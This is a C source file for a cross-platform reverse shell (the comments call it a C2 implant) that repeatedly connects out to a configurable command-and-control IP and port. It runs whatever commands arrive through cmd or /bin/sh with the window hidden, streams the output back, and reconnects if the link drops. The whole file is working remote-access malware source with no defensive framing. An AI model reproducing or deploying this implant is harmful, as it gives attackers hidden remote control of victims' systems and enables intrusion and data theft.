#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <libgen.h>
#include <time.h>

// 版本信息头文件
#include "version.h"



#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #include <direct.h>
    
    // 微软官方的编译器cl用这个
    #ifdef _MSC_VER
        #pragma comment(lib, "ws2_32.lib")
    #endif

    // MinGW / W64devkit GCC用这个
    #ifdef __MINGW32__
        __attribute__((used, section(".drectve")))
        static const char * __mingw_lib_ws2_32 = "-lws2_32";
    #endif
    
    #define chdir _chdir
    #define getcwd _getcwd
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <sys/wait.h>
    #include <signal.h>
    #include <fcntl.h>
    #include <sys/select.h>
#ifndef MSG_NOSIGNAL
    #define MSG_NOSIGNAL 0
#endif

#ifdef __APPLE__
    #ifndef SO_NOSIGPIPE
        #define SO_NOSIGPIPE 0x1022
    #endif
#endif
#endif

// 默认配置，可以根据需要修改 C2 的 IP 和端口
#ifndef C2_IP
    #define C2_IP "127.0.0.1"
#endif
#ifndef C2_PORT
    #define C2_PORT 4444
#endif

#define BUF_SIZE 8192

// --- 真正的正统执行器：防卡死、防断线完全体 ---
void execute_no_timeout(int sock, char* raw_cmd) {
#ifdef _WIN32
    // ================= Windows 平台：纯非阻塞轮询（防卡死） =================
    char cmdline[BUF_SIZE + 64];
    snprintf(cmdline, sizeof(cmdline), "cmd /c \"%s\"", raw_cmd);

    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0)) return;
    SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hChildStd_OUT_Wr;  
    siStartInfo.hStdOutput = hChildStd_OUT_Wr; 
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo)) {
        CloseHandle(hChildStd_OUT_Wr);

        char buffer[BUF_SIZE];
        DWORD dwRead;
        DWORD dwAvail = 0;

        while (1) {
            if (!PeekNamedPipe(hChildStd_OUT_Rd, NULL, 0, NULL, &dwAvail, NULL)) break;

            if (dwAvail > 0) {
                if (ReadFile(hChildStd_OUT_Rd, buffer, sizeof(buffer) - 1, &dwRead, NULL) && dwRead > 0) {
                    buffer[dwRead] = '\0';
                    if (send(sock, buffer, (int)dwRead, 0) < 0) {
                        TerminateProcess(piProcInfo.hProcess, 0);
                        break;
                    }
                }
            } else {
                fd_set read_fds;
                struct timeval tv;
                FD_ZERO(&read_fds);
                FD_SET(sock, &read_fds);
                tv.tv_sec = 0; 
                tv.tv_usec = 0;

                int select_res = select(0, &read_fds, NULL, NULL, &tv);
                if (select_res > 0) {
                    char test_buf[1];
                    int recv_res = recv(sock, test_buf, 1, MSG_PEEK);
                    if (recv_res == 0 || (recv_res < 0 && WSAGetLastError() != WSAEWOULDBLOCK)) {
                        TerminateProcess(piProcInfo.hProcess, 0);
                        break;
                    }
                }

                DWORD exitCode;
                GetExitCodeProcess(piProcInfo.hProcess, &exitCode);
                if (exitCode != STILL_ACTIVE) {
                    while (ReadFile(hChildStd_OUT_Rd, buffer, sizeof(buffer) - 1, &dwRead, NULL) && dwRead > 0) {
                        send(sock, buffer, (int)dwRead, 0);
                    }
                    break;
                }
                Sleep(50);
            }
        }
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
    } else {
        CloseHandle(hChildStd_OUT_Wr);
    }
    CloseHandle(hChildStd_OUT_Rd);

#else
    // ================= Linux/Macos/BSD 平台：防死锁、防断连僵尸 =================
    int pipefd[2];
    if (pipe(pipefd) < 0) return;

    // 创建子进程
    pid_t pid = fork();
    if (pid < 0) { close(pipefd[0]); close(pipefd[1]); return; }

    if (pid == 0) {
        // 子进程
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        
        // 【防线 1】把子进程及其孙子进程（比如 ping）扔进独立进程组
        setpgid(0, 0);
        execl("/bin/sh", "sh", "-c", raw_cmd, (char *)NULL);
        exit(1);
    }

    // 父进程
    close(pipefd[1]);
    
    // 把管道读端设为非阻塞
    int flags = fcntl(pipefd[0], F_GETFL, 0);
    fcntl(pipefd[0], F_SETFL, flags | O_NONBLOCK);

    // 监听最大描述符
    char buffer[BUF_SIZE];
    while (1) {
        fd_set read_fds;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 100000; // 0.1 秒超时
        
        FD_ZERO(&read_fds);             // 清空读描述符集
        FD_SET(pipefd[0], &read_fds);   // 监听管道回显
        FD_SET(sock, &read_fds);        // 监听 Socket 死活

        // 监听最大描述符
        int max_fd = (pipefd[0] > sock) ? pipefd[0] : sock;
        int select_res = select(max_fd + 1, &read_fds, NULL, NULL, &tv);

        if (select_res > 0) {
            // 1. 检查 Socket 是不是断开了
            if (FD_ISSET(sock, &read_fds)) {
                char test_buf[1];
                int recv_res = recv(sock, test_buf, 1, MSG_PEEK);
                if (recv_res == 0 || (recv_res < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                    // 控制端掐线了，直接强杀整个子进程组！
                    kill(-pid, SIGKILL);
                    break; 
                }
            }

            // 2. 检查管道有没有数据吐出来
            if (FD_ISSET(pipefd[0], &read_fds)) {
                ssize_t r_len = read(pipefd[0], buffer, sizeof(buffer) - 1);
                if (r_len > 0) {
                    buffer[r_len] = '\0';
                    if (send(sock, buffer, r_len, MSG_NOSIGNAL) < 0) {
                        kill(-pid, SIGKILL);
                        break;
                    }
                }
            }
        }

        // 3. 检查子进程是不是自己正常跑完了
        int status;
        pid_t result = waitpid(pid, &status, WNOHANG); // 使用 WNOHANG 非阻塞等待！
        if (result == pid || result < 0) {
            // 命令执行完了，把管道里最后剩下的数据吸干
            ssize_t r_len;
            while ((r_len = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
                send(sock, buffer, r_len, MSG_NOSIGNAL);
            }
            break;
        }
    }
    
    close(pipefd[0]);
    // 彻底收尾，防止僵尸进程
    waitpid(pid, NULL, WNOHANG);
#endif
}

// 上线后发送彩色Logo和当前程序信息到服务端
int show_logo(int s) {

#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define CYAN    "\033[36m"

#define UNDERLINE "\033[4m" // 下划线
#define BOLD    "\033[1m" // 粗体

#define RESET   "\033[0m"

    char logo_buf[1024];  // logo 足够大的缓冲区
    char info_buf[512];  // info 足够大的缓冲区
    
    // 拼接彩色Logo字符串
    sprintf(logo_buf,
        "%s   _____    __  __               %s_____  %s\r\n"
        "%s  / ____|  |  \\/  |             %s/ ____| %s\r\n"
        "%s | |       | \\  / |   %s___%s___   %s| |      %s\r\n"
        "%s | |       | |\\/| |  %s|___%s___|  %s| |      %s\r\n"
        "%s | |____   | |  | |            %s| |____   %s\r\n"
        "%s  \\_____|  |_|  |_|             %s\\_____|%s\r\n\n",
        "\r\n"
        RED, BLUE, RESET,
        RED, BLUE, RESET,
        GREEN, YELLOW, CYAN, BLUE, RESET,
        GREEN, YELLOW, CYAN, BLUE, RESET,
        BLUE, RED, RESET,
        BLUE, RED, RESET
    );

    // 当前程序的版本号和构建日期和构建时间和项目URL和Issue URL
        sprintf(info_buf,
            "%sVersion: %s%s%s%s, %sBuild: %s%s%s %s%s\r\n",
            // "%sProjectURL: %s%s%s\r\n"
	    // "%sIssueURL: %s%s%s\r\n",
        RED, BOLD, UNDERLINE, VERSION_STR, RESET, BLUE, BOLD, UNDERLINE, BUILD_DATE, BUILD_TIME, RESET//,
        // GREEN, BOLD, PROJECT_URL, RESET, YELLOW, BOLD, ISSUE_URL, RESET, RESET
    );

    // 发送完整Logo和当前程序信息
    send(s, logo_buf, strlen(logo_buf), 0);
    send(s, info_buf, strlen(info_buf), 0);

    return 0;
}


// 成功上线演示提示
int Payload_Demonstrate(void) {
#ifdef _WIN32
    // Windows 实现：通过ShellExecute来打开默认计算器
    // 先尝试启动 Windows 计算器应用（UWP），如果失败则回退到传统 calc.exe
    HINSTANCE result = ShellExecute(NULL, NULL, "calculator://", NULL, NULL, SW_SHOWNORMAL);
    if ((INT_PTR)result <= 32) {
        // calculator:// 协议失败，回退到 calc.exe
        ShellExecute(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOWNORMAL);
    }

#elif defined(_APPLE)
    // macOS(Darwin) 实现：通过posix_spawn来打开 Calculator.app，避免弹出终端窗口
    pid_t pid;
    extern char **environ;
    const char *argv[] = {"Calculator.app", NULL};
    posix_spawn(&pid, "Calculator.app", NULL, NULL, argv, environ);

#else
    // 其他的默认是UNIX平台
    // Linux/BSD等等(UNIX) 实现：通过posix_spawn来打开默认计算器，避免弹出终端窗口
    // 这里的代码还没有测试过，所以这里暂无可实现的功能
    // 你可以根据需要修改代码，尝试打开其他默认计算器应用

#endif
    return 0;
}

// --- 主程序入口 ---
int main(int argc, char *argv[]) {
    // 成功上线演示提示(可根据需要注释掉或取消注释)
	// Payload_Demonstrate();
#ifndef _WIN32
    signal(SIGINT, SIG_IGN);   
    signal(SIGPIPE, SIG_IGN);  
#endif

// 初始化Winsock
#ifdef _WIN32
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    char buf[BUF_SIZE];
    char path[512];

    while (1) {
        int s;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(C2_PORT);
        addr.sin_addr.s_addr = inet_addr(C2_IP);

        while (1) {
            s = (int)socket(AF_INET, SOCK_STREAM, 0);
            if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) >= 0) {
                break; 
            }
#ifdef _WIN32
            closesocket(s); Sleep(5000); 
#else
            close(s); sleep(5);
#endif
        }
        
        show_logo(s);
        send(s, "[+] Connected successfully.\n", 27, 0);

        while (1) {
            getcwd(path, sizeof(path));

            #ifdef _WIN32
            // 获取当前程序的文件名
            const char* Program_name = basename(__argv[0]);
            #else
            const char* Program_name = basename(argv[0]);
            #endif

            // 获取当前的日期和时间
            time_t now = time(NULL);
            struct tm* tm = localtime(&now);
            char date_time[32];
            strftime(date_time, sizeof(date_time), "%Y-%m-%d %H:%M:%S", tm);

            // 构建提示符
            char prompt[600];
            snprintf(prompt, sizeof(prompt), "\n-{%s}-{(%s)[%s]}-> ", date_time, Program_name, path);
            
            if (send(s, prompt, (int)strlen(prompt), 0) < 0) {
                break; 
            }

            // 接收控制端的命令
            memset(buf, 0, BUF_SIZE);
            int len = (int)recv(s, buf, BUF_SIZE - 1, 0);
            if (len <= 0) break; // 控制端掐断，立刻触发重连
            
            buf[strcspn(buf, "\r\n")] = 0;
            if (strlen(buf) == 0) continue;
            
            if (strcmp(buf, "exit") == 0) {
                send(s, "[-] Logout.\n", 12, 0);
#ifdef _WIN32
                closesocket(s); WSACleanup();
#else
                close(s);
#endif
                return 0;
            }

            // 处理cd命令
            if (strncmp(buf, "cd ", 3) == 0) {
                chdir(buf + 3);
                continue;
            }

            execute_no_timeout(s, buf);
        }

// 关闭连接
#ifdef _WIN32
        closesocket(s); Sleep(2000);  
#else
        close(s); sleep(2);           
#endif
    }  

// 清理Winsock
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
